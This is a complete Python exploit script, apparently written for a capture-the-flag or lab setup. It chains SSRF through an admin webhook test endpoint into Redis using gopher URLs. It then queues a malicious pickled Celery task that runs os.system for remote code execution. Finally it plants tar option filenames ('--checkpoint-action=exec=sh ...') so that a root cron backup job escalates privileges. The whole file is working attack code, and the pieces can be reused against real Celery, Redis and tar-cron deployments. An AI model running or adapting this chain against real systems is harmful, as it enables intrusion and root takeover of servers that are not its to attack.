#!/usr/bin/env python3

import ast
import base64
import json
import os
import pickle
import time
import urllib.parse

import requests


WEBHOOK_URL = "http://localhost:8080/api/admin/webhook-test"

JWT = os.environ["SESSION_TOKEN"]

RESULT_KEY = "ctf:rce_result"

APP_DIR = "/var/log/app"
ROOT_MARKER = "/tmp/tar_root_success"


# ============================================================
# Stage 4: 建立 tar wildcard injection
# ============================================================

STAGE4_SCRIPT = f"""
import os
import socket
import redis

r = redis.Redis(
    host="redis",
    port=6379,
    decode_responses=True,
)

APP_DIR = "{APP_DIR}"

proof_script = '''#!/bin/sh
id > {ROOT_MARKER}
'''

try:
    os.makedirs(APP_DIR, exist_ok=True)

    # --------------------------------------------------------
    # root cron 會執行：
    #
    # cd /var/log/app &&
    # tar -czf /var/backups/submissions_log.tar.gz *
    #
    # 因此準備兩個看起來像 tar option 的檔名。
    # --------------------------------------------------------

    proof_path = os.path.join(
        APP_DIR,
        "root-proof.sh",
    )

    with open(proof_path, "w") as f:
        f.write(proof_script)

    os.chmod(proof_path, 0o755)

    checkpoint = os.path.join(
        APP_DIR,
        "--checkpoint=1",
    )

    checkpoint_action = os.path.join(
        APP_DIR,
        "--checkpoint-action=exec=sh root-proof.sh",
    )

    open(checkpoint, "w").close()
    open(checkpoint_action, "w").close()

    status = "PAYLOAD_INSTALLED"

except Exception as e:
    status = "INSTALL_ERROR: " + repr(e)


result = {{
    "stage": 4,
    "status": status,
    "user": os.popen("id -un").read().strip(),
    "hostname": socket.gethostname(),
    "target": APP_DIR,
}}

r.set(
    "{RESULT_KEY}",
    str(result),
    ex=180,
)
"""


# ============================================================
# Stage 5: 檢查 root cron 是否已經觸發
#
# 這個 task 仍然以 celeryuser 執行。
# 但是 /tmp/tar_root_success 是由 root cron 建立的。
# ============================================================

STAGE5_SCRIPT = f"""
import os
import redis

r = redis.Redis(
    host="redis",
    port=6379,
    decode_responses=True,
)

marker = "{ROOT_MARKER}"

if os.path.isfile(marker):
    try:
        with open(marker, "r") as f:
            proof = f.read().strip()

        result = {{
            "stage": 5,
            "status": "ROOT_SUCCESS",
            "marker": marker,
            "proof": proof,
        }}

    except Exception as e:
        result = {{
            "stage": 5,
            "status": "ROOT_MARKER_READ_ERROR",
            "error": repr(e),
        }}

else:
    result = {{
        "stage": 5,
        "status": "WAITING_FOR_ROOT_CRON",
        "marker": marker,
    }}


r.set(
    "{RESULT_KEY}",
    str(result),
    ex=180,
)
"""


# ============================================================
# Pickle RCE
# ============================================================

def make_rce_pickle(command):
    class RCE:
        def __reduce__(self):
            return (
                __import__("os").system,
                (command,),
            )

    payload = pickle.dumps(
        RCE(),
        protocol=2,
    )

    return base64.b64encode(payload).decode()


def script_to_command(script):
    """
    使用 base64 傳遞 Python script，
    避免 shell quoting / newline 問題。
    """

    encoded = base64.b64encode(
        script.encode()
    ).decode()

    return (
        f"echo {encoded} "
        f"| base64 -d "
        f"| python3"
    )


# ============================================================
# Celery envelope
# ============================================================

def make_task(script):
    command = script_to_command(script)

    return {
        "content-type": "application/x-python-serialize",
        "properties": {
            "delivery_tag": "16f3f59d-003c-4ef4-b1ea-6fa92dee529a",
            "reply_to": "9edb8565-0b59-3389-944e-a0139180a048",
            "delivery_mode": 2,
            "body_encoding": "base64",
            "delivery_info": {
                "routing_key": "celery",
                "priority": 0,
                "exchange": "celery",
            },
            "correlation_id": "6e046b48-bca4-49a0-bfa7-a92847216999",
        },
        "headers": {},
        "content-encoding": "binary",
        "body": make_rce_pickle(command),
    }


# ============================================================
# Redis RESP
# ============================================================

def make_redis_lpush(task_json):
    """
    LPUSH celery <task_json>
    """

    data = task_json.encode()

    return (
        b"*3\r\n"
        b"$5\r\nLPUSH\r\n"
        b"$6\r\ncelery\r\n"
        + f"${len(data)}\r\n".encode()
        + data
        + b"\r\n"
    )


def make_redis_get(key):
    """
    GET <key>
    """

    key_bytes = key.encode()

    return (
        b"*2\r\n"
        b"$3\r\nGET\r\n"
        + f"${len(key_bytes)}\r\n".encode()
        + key_bytes
        + b"\r\n"
    )


# ============================================================
# Gopher
# ============================================================

def make_gopher_url(resp):
    encoded = urllib.parse.quote_from_bytes(
        resp,
        safe="",
    )

    return "gopher://redis:6379/_" + encoded


# ============================================================
# SSRF → Redis
# ============================================================

def ssrf_redis(resp):
    gopher_url = make_gopher_url(resp)

    headers = {
        "Content-Type": "application/json",
        "Cookie": f"session_token={JWT}",
    }

    return requests.post(
        WEBHOOK_URL,
        headers=headers,
        json={
            "url": gopher_url,
        },
        timeout=10,
    )


# ============================================================
# Decode webhook → Redis RESP → Python dict
# ============================================================

def decode_redis_response(response_text):
    try:
        outer = json.loads(response_text)

        body = outer.get("body", "")

        if not isinstance(body, str):
            return None

        # Redis NIL
        if body.startswith("$-1"):
            return None

        # Redis bulk string
        if body.startswith("$"):
            header, payload = body.split(
                "\r\n",
                1,
            )

            length = int(header[1:])

            if length < 0:
                return None

            payload = payload[:length]

        else:
            payload = body

        result = ast.literal_eval(payload)

        if not isinstance(result, dict):
            return None

        return result

    except (
        json.JSONDecodeError,
        ValueError,
        SyntaxError,
        AttributeError,
    ):
        return None


# ============================================================
# 印出結果
# ============================================================

def print_result(result):
    print("\n[+] Result")
    print("----------------------------------------")

    print(
        json.dumps(
            result,
            indent=2,
            ensure_ascii=False,
        )
    )

    print("----------------------------------------")


# ============================================================
# 發送 Celery task
# ============================================================

def send_task(script):
    task = make_task(script)

    task_json = json.dumps(
        task,
        separators=(",", ":"),
    )

    resp = make_redis_lpush(task_json)

    return ssrf_redis(resp)


# ============================================================
# Main
# ============================================================

def main():

    print("[+] Target:")
    print(f"    {WEBHOOK_URL}")

    print("[+] Redis result key:")
    print(f"    {RESULT_KEY}")

    print("[+] Stage 4:")
    print("    Pickle RCE")
    print("    ↓")
    print(f"    Write tar payload into {APP_DIR}")

    print("[+] Stage 5:")
    print("    root cron")
    print("    ↓")
    print("    tar wildcard injection")
    print("    ↓")
    print(f"    {ROOT_MARKER}")

    # ========================================================
    # Stage 4
    # ========================================================

    print("\n[+] Stage 4: sending RCE payload...")

    response = send_task(STAGE4_SCRIPT)

    print(
        f"[+] HTTP status: {response.status_code}"
    )

    # 等 worker 執行 Stage 4
    print("\n[+] Waiting for Stage 4...")

    stage4_ok = False

    for attempt in range(20):

        time.sleep(0.5)

        get_resp = make_redis_get(
            RESULT_KEY
        )

        result_response = ssrf_redis(
            get_resp
        )

        result = decode_redis_response(
            result_response.text
        )

        if result is None:
            continue

        if result.get("stage") == 4:

            print_result(result)

            if result.get("status") == "PAYLOAD_INSTALLED":
                stage4_ok = True

            break

    if not stage4_ok:
        print(
            "\n[-] Stage 4 payload was not installed."
        )
        return

    print("\n[+] Stage 4 complete.")
    print(
        f"[+] Waiting for root cron to execute tar..."
    )

    # ========================================================
    # Stage 5
    #
    # cron 每分鐘執行一次，所以最多等約 75 秒。
    # 每次檢查都重新送一個 celery task。
    # ========================================================

    for attempt in range(75):

        time.sleep(1)

        print(
            f"\n[+] Stage 5 check "
            f"{attempt + 1}/75"
        )

        # ----------------------------------------------------
        # 第二個 Celery task：
        #
        # 仍然以 celeryuser 執行，
        # 但檢查 root cron 是否建立 marker。
        # ----------------------------------------------------

        response = send_task(
            STAGE5_SCRIPT
        )

        if response.status_code >= 500:
            print(
                f"[-] HTTP {response.status_code}"
            )

        # 等 worker 處理第二個 task
        time.sleep(0.25)

        get_resp = make_redis_get(
            RESULT_KEY
        )

        result_response = ssrf_redis(
            get_resp
        )

        result = decode_redis_response(
            result_response.text
        )

        if result is None:
            continue

        if result.get("stage") != 5:
            continue

        status = result.get("status")

        if status == "WAITING_FOR_ROOT_CRON":
            print(
                "[+] Root cron has not fired yet."
            )
            continue

        if status == "ROOT_SUCCESS":

            print_result(result)

            print(
                "\n[+] Stage 5 completed!"
            )

            print(
                "[+] Privilege escalation confirmed."
            )

            return

        print_result(result)

    # ========================================================
    # Timeout
    # ========================================================

    print(
        "\n[-] Stage 5 did not complete "
        "within the timeout."
    )

    print(
        "\n[-] Check the cron configuration:"
    )

    print(
        "    docker compose exec "
        "celery-worker "
        "cat /etc/cron.d/*"
    )

    print(
        "\n[-] Check cron process:"
    )

    print(
        "    docker compose exec "
        "celery-worker "
        "ps aux | grep '[c]ron'"
    )


if __name__ == "__main__":
    main()